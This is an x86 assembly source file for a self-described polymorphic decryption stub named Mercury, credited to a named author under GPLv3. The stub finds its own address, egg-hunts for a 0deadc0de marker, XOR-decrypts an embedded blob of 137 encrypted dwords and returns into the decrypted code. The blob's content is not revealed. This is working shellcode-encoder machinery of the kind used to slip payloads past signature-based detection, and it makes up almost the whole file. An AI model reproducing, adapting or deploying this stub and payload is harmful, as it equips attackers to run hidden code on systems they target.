;;;;MMMMMMMMMMMMMMMMMMMMMWNXK0kxdooodddooloxO0KNWMMMMMMMMMMMMMMMMMMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMWXOxl:;'... ...';;,,'.....;oxOKNWMMMMMMMMMMMMMMMMMMMM
;;;;MMMMMMMMMMMMMMWXOdlc:;;;:cc::;,',lxxxxo:,....,,,:lkKWMMMMMMMMMMMMMMMMM
;;;;MMMMMMMMMMMMN0dc:::loxkO0OOkxxdl:cdOOOOxoc;',lc'..';lkXWMMMMMMMMMMMMMM
;;;;MMMMMMMMMMNkc'...';ldkkO0Oxdoc:;,,;::::cclc,:xxc,',,'';dKWMMMMMMMMMMMM
;;;;MMMMMMMMW0l,...,coddooolc;,'.... .....  .,;,cdxdl:cc,'..,dXMMMMMMMMMMM
;;;;MMMMMMMNx;....cdxdddol:;;;::cccc::::;;'.''...':looddl;'...:kNMMMMMMMMM
;;;;MMMMMMNd'...'cddxdoc::codxOO000OOOOkkxdlll,....,coxxxo:'...'oXMMMMMMMM
;;;;MMMMMNd'.  .colll;,,:lddxkkdlc;;;;:::loodxo:,,'',cddxxdc,....lXMMMMMMM
;;;;MMMMNd.   'okxdl'.':looooc;'''''.......';ldddl::;,;oxxxd:'....lXMMMMMM
;;;;MMMMO,  .,d0Oko' .,lddl;'',:looollll:,....;oddxo:'.,oxxxo:'....oNMMMMM
;;;;MMMWd....;xOkx;  .,oOx;..;ccc:cc:;;:codc'..'lxkxc'..;oxxxl'....,kWMMMM
;;;;MMMNo....;xOkd'  .:xOl'':oc;:;;:::;'.'lx:.  'oxxl,..'cdddl;'....lXMMMM
;;;;MMMXc....:xxxo.  .:xkl',ll;;;,::;,;:,.,oo'. .:ddl,...,oodoc,....,OMMMM
;;;;MMMXc....,dkkd'  .,oOx;,:oc,,,;;'':c,.'lo'  .;ddo;...,odddl'....'xWMMM
;;;;MMMNo..  ,xOkd;  ..:kOo;,:lc;,,,;:;,..:dc.. .cxxd;...,odddc'.....oNMMM
;;;;MMMWk'  .,oxxdo' ..,lxkdc,,;:::::,'',cdd;...,dxkl'...cddxd:'.....oNMMM
;;;;MMMMXc....,lkkko'....,lxkxl;,''',;lodo:'...'lxxo,.  'odddo;......dWMMM
;;;;MMMMMKc....,oOOkd:.  ..,:looooooolc:,... .'lddl,.  .cooddc,.....,OWMMM
;;;;MMMMMWKc.  .,okkkxl;.. ...........     ..;cll:.   .:oddxo;......cKMMMM
;;;;MMMMMMMXl....'cdxdlodl;'..         ...;col:;'.   .:oodxo:......,kWMMMM
;;;;MMMMMMMMNx;....';;coxkxdol:;''',;:ccldxxxo:'....;loodxo:'......oNMMMMM
;;;;MMMMMMMMMWKd;......,cddddkkdl::ccllolc:,'.....,coodxxo:''.....cKMMMMMM
;;;;MMMMMMMMMMMWXxc,..  ..',;cloo:'',,,,'.......';:cclooc,'......:0WMMMMMM
;;;;MMMMMMMMMMMMMMN0d:.. .......,;,. ....  ...,;,,;:::;'........;OWMMMMMMM
;;;;MMMMMMMMMMMMMMMMWN0xl:,......';,'......,,'''',,,'..........cKWMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMMMMMWXK0Okxxkkdcc:::::::,'...........  ..:KMMMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0xool::clll:;,''........':kWMMMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXOxoc:;;;::::;,,'',cdONMMMMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0xdl:;;,,,;:ok0NMMMMMMMMMMMMM
;;;;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXKK000KNWMMMMMMMMMMMMMMMM
;;;;----------------------------------------------------------------------;
;;;; x86 Polymorphic Decryption Stub                                      ;
;;;;----------------------------------------------------------------------;
;;;; Author: Forrest Orr - 2021                                           ;
;;;;----------------------------------------------------------------------;
;;;; Contact: forrest.orr@protonmail.com                                  ;
;;;;----------------------------------------------------------------------;
;;;; Licensed under GNU GPLv3                                             ;
;;;;______________________________________________________________________;
;;;; ## Features                                                          ;
;;;;                                                                      ;
;;;; ~ XOR/ADD/SUB decryption loop
;;;;______________________________________________________________________;

;mov reg1, 32-bit xor key
;FPU get EIP -> reg2 <- THIS is considered EIP (start of FPU instruction) not MOV above it.
;xor ecx, ecx
;mov cl, (number of loop iterations for 32-bit decrypt ie. payload size / 4)
;xor dword [reg2 + size of this decrypter stub (small)], reg1 <- loop goes to here
;add reg2, 4
;add reg1, dword [reg2 + offset from EIP to start of xor instruction (which is 3 bytes) also includes the opcode of the next add instruction]
;loop 

;%Define DEBUG
%Ifdef DEBUG
Global _Mercury32
%Endif
%Include "..\Include\Windows.inc"
Bits           32

Section .text

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                           Mercury                                   ;;;  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

_Mercury32:

Call           GetEIP

GetEIP:

Mov            Ebx, 11111111h ; Key
Pop            Ecx

EggHunter:

Mov            Eax, Dword [Ecx]
Inc            Eax
Mov            Edx, (0deadc0deh + 1)
Cmp            Eax, Edx ; This form of comparison is essential otherwise the egg within this egghunter code may be mistaken for the real egg
Je             DecryptPayload
Inc            Ecx
Jmp            EggHunter

DecryptPayload:

Add            Ecx, 4 ; Skip over egg
Push           Ecx
Mov            Edx, 137

DecryptNext:

Xor            Dword [Ecx], Ebx
Add            Ecx, 4
Dec            Edx
Test           Edx, Edx
Jz             LoadDecryptedAddress
Jmp            DecryptNext

LoadDecryptedAddress:

Ret

Dd 0deadc0deh

EncryptedData:

Dd 079f49871h, 0111c5f99h, 0111142f9h, 046977911h, 0f941111ch, 011111185h, 011232279h, 062447911h, 0ee456374h, 0a90b79c1h, 0f9411117h, 01111116dh, 06179757bh, 098747f66h, 0747f79f0h, 07e791165h, 0793f6363h, 03c656274h, 0637e7779h, 066667963h, 0f3983f66h, 04043117bh, 0c1ee117bh, 0d270fd98h, 046f49844h, 01121af47h, 0bc751111h, 09a1d519ah, 0ef980969h, 015fad120h, 03965e628h, 03565e794h, 094354f9ch, 09a0565cah, 0d894155ah, 0107b1c65h, 0104cf940h, 0542a1111h, 020176519h, 0fa279ad1h, 001579ac6h, 0fd984e4fh, 01115d34ch, 090f49844h, 0111321fdh, 019549a11h, 09ae95498h, 05312e944h, 015d1922dh, 092e15498h, 0549805d1h, 09ad398e5h, 053121954h, 0755b9a71h, 098c15c98h, 0d398ed54h, 01219549ah, 054983153h, 0ed449afdh, 01219549ah, 054983553h, 0ed449af5h, 01219549ah, 054980d53h, 098d120f9h, 05498f154h, 0ed549ac9h, 02a09519ah, 0971ef154h, 0111111c3h, 09cf1549ah, 01111941dh, 0449a1111h, 019549afdh, 098001512h, 0117bc554h, 011acf941h, 0542a1111h, 0b0941e1dh, 09a111111h, 0059cf154h, 0f5549a11h, 01315a61eh, 011941d9ch, 09a111111h, 0549af944h, 000151219h, 09ac95498h, 0db98ed5ch, 028c14412h, 0286e6dd9h, 0d66a6cc1h, 01111c954h, 0d8201111h, 0ecc18c9ch, 0059beeeeh, 011eb9119h, 0eb913165h, 0d604643fh, 07d753f12h, 015d2927dh, 09c1112d7h, 0eeefc18ch, 0cffa50eeh, 052500299h, 012d7c9fah, 0c18c9c11h, 07beeeeech, 02df94211h, 041111111h, 0eeefb2f9h, 065d194eeh, 0cd549838h, 0849c117bh, 0eeeeefc1h, 01130f943h, 0ee411111h, 0c0f9cd64h, 098eeeeefh, 01bfac954h, 0eef1549ch, 0ee0ef811h, 0549aeeeeh, 04cfd98c9h, 0441119d3h, 09a46f498h, 06c9a195ch, 091ca201dh, 005651128h, 01d10a71eh, 0c1a71e71h, 0f2c0c210h, 065ee9450h, 0f6fa50fbh, 0984ec998h, 019d34cfdh, 011111111h